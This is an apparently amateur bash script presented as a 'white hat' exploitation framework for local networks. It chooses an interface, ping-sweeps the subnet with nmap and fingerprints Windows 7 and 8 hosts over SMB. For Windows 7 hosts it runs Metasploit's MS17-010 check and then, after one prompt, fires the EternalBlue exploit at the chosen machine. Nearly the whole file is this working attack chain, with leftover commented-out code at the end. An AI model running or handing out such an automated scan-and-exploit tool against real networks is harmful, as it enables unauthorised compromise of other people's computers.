#!/bin/bash
#---------------BANNER----------
clear
red='\e[0;31m'
green='\e[0;32m'
close='\e[0m'

figlet -c CYBER SECURITY EXPLOIT
figlet -c WHITE HAT 
echo -e " BANNER"

#-------------------------------

echo -e "${green}                    DISCLAIMER ${close} "
#------------------------------
echo "================================================================="
echo -e "${red}THIS IS A EXPLOITATION FRAMEWORK THAT WILL CONTAIN VARIOUS PHASES "${close}
echo "================================================================="
echo "-------                     ------------------"
echo "|PHASE1|------------------->|ACTIVE INTERFACES|
-------                     ------------------

--------                   ------------------"
echo "|PHASE2|------------------>|CHOOSE INTERFACE|
--------                   ------------------"



echo "-------                     ------------------"
echo "|PHASE1|------------------->|SCANE INTERFACES|
-------                     ------------------

--------                   ------------------------"  
echo "|PHASE3|------------------>|VULNERABILITY SCANNING|
--------                   ------------------------

--------                    --------------
|PHASE4|------------------>|EXPLOITATION | 
--------                    --------------"
#YOU GOT VULNERABIlIY if you want exploit ,you can.  
echo "================================================================="
#-----------------------------
#!/bin/bash
#show active interfaces----->
#bb=$( ifconfig | awk 'NR==16{print $1}') 
#if [ "$bb" == "inet" ]
#then
echo Active interfaces
ip route|grep "dhcp" | awk '{print NR " " $5 }'
#r=$(ifconfig | grep "flag" | cut -d ":" -f 1 | awk '{print NR ":" $1}')
s=$(ip route|grep "dhcp" | awk ' {print $5 }')
#echo $s
#d=$(echo $r | wc -w)
#echo $d
while true
do
echo "Enter Your Choice"
read b
#echo "$r" | grep "$b" |awk '{print "you selected " $1}'
echo You Selected
echo "$s" |awk 'NR=='$b'{print $1}'
d=$(echo "$s" |awk 'NR=='$b'{print $1}')
if [ -z "$d" ];then
	echo "you think you are smart and you choose a option that is not available choose Right option "
	continue
else
echo Your IP On This Selected Network is
ip route | grep "src" | grep $d |awk '{print $9 }'
break 
fi
done
vr=$(ip route | grep "kernel" | grep $d |awk '{print $1 }' )
echo Do You Want List Of Active Hostes y/n
read f
if [ "$f" == "y" ];then
nmap -n -sP $vr |grep "Nmap scan" | awk '{print NR " " $5 }' 
rt=$(nmap -n -sP $vr |grep "Nmap scan" | awk '{print NR " " $5 }')
fi
	echo "NOW WE ARE SCANNING FOR OS DETETION"
	echo "Choose your options
  	1-windows 8/8.1
  	2-windows 7"
 	read p
 	if [ "$p" == "1" ];then 
       v=$(nmap --script smb-os-discovery.nse "$vr" | grep -e "Nmap scan report for" -e "OS:" | grep -v "nmap")
       #v=$(nmap -F --script smb-os-discovery.nse 172.18.20.0/24 | grep -B1 "OS:" | awk '{print $1,$2,$3,$4,$5}')
		#echo "$v" 
		w=$(echo "$v" | grep -B1 "OS: Windows 8" )
		p=$(echo "$w" | cut -c 5- )
		echo "$p"
		bh=$(echo "$w" | grep "Nmap scan" | awk '{print NR ":"$5}')
		bhw=$(echo "$w" | grep "Nmap scan" | awk '{print $5}')
		if [ -z "$bh" ];
		then
		 echo "NO WINDOWS 8/8.1 OS DETECTED"
		else
			echo " OS DETEcTed $bh"
		    echo "choose your ip for VULNERABILITY SCAN"
		    read vh
		    echo "YOU Selected"
		    hj=$(echo "$bhw" | awk 'NR=='$vh'{print $1}')
		    echo "$hj"
		 fi	 
	else
	 v=$(nmap --script smb-os-discovery.nse "$vr" | grep -e "Nmap scan report for" -e "OS:" | grep -v "nmap")
       #v=$(nmap -F --script smb-os-discovery.nse 172.18.20.0/24 | grep -B1 "OS:" | awk '{print $1,$2,$3,$4,$5}')
		#echo "$v" 
		w=$(echo "$v" | grep -B1 "OS: Windows 7" )
		p=$(echo "$w" | cut -c 5- )
		echo "$p"
		bh=$(echo "$w" | grep "Nmap scan" | awk '{print NR ":"$5}')
		bhw=$(echo "$w" | grep "Nmap scan" | awk '{print $5}')
		if [ -z "$bh" ];
		then
		 echo "NO WINDOWS 7 OS DETECTED"
		else
			echo " OS DETEcTed $bh"
		    echo "choose your ip for VULNERABILITY SCAN"
		    read vh
		    echo "YOU Selected"
		    hj=$(echo "$bhw" | awk 'NR=='$vh'{print $1}')
		    echo "$hj"
            echo "now we are checking smb VULNERABILITY"
		    msfconsole -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $hj; exploit ; exit" -o a.txt
            e=$(cat a.txt | grep "Host is likely" | awk '{print $7}')
            		if [ "$e" == "VULNERABLE" ];then
	        		echo "host is smb VULNERABLE 
	        		So do you want to exploit it y/n"
	        		read g
	                    if [ "$g" == "y" ];then
                            msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $hj; exploit "
                         
                              fi
            		else
	        		echo "HOST IS NOT smb VULNERABLE"
            		fi 
		 fi	 
	fi












#echo $rt
#for (( i = 0; i < 10; i++ )); do
# 	echo "$rt" |awk 'NR=='$i'{print NR " " $2}'
# 	as=$(echo "$rt" |awk 'NR=='$i'{print NR " " $2}')
# 	nmap -O $as| grep "Running" | awk '{print $2,$3,$4 }'
# done
# vb=$(echo "$rt" | awk 'NR=='$g'{print NR " " $2}')
#echo "choose options
#      1-OS scan
#      2-Port Scan" 
#                
# read c
# if [ "$c" == "1" ];then
# 	nmap -n -O $rt | grep "Running" | awk '{print $2,$3,$4 }'
# elif [ "$c" == "2" ];then
#  nmap -sS $vb | grep "open"
#fi
#fi	
#fi

#ifconfig | grep "flag" | awk '{print$1}' | cut -d ":" -f 1 | awk '{print NR " : " $1}'
#read n
#if [ "$n" -eq 1 ]
#then
	
#var=$( ifconfig | grep "flag" | awk '{print$1}' | cut -d ":" -f 1 | awk 'NR=='$n'{print $1}' )
#echo "$var"
#echo hey
#fi 
#cat st.txt
#echo $a 

# show gateway---------------->route -n | grep "UG" | awk '{print $2}'
# self IP---------------------> 
# ifconfig | grep "inet" |grep -v "inet6" |grep -v "127.0.0.1"| awk '{print$2}'
# a=$(ifconfig | grep "inet" |grep -v "inet6" |grep -v "127.0.0.1"| awk '{print$2}')
# echo " 'grep -v "awk '{print$4}' " $a' "
# fi
# cd /sys/class/net && select foo in * exit; echo $foo selected;
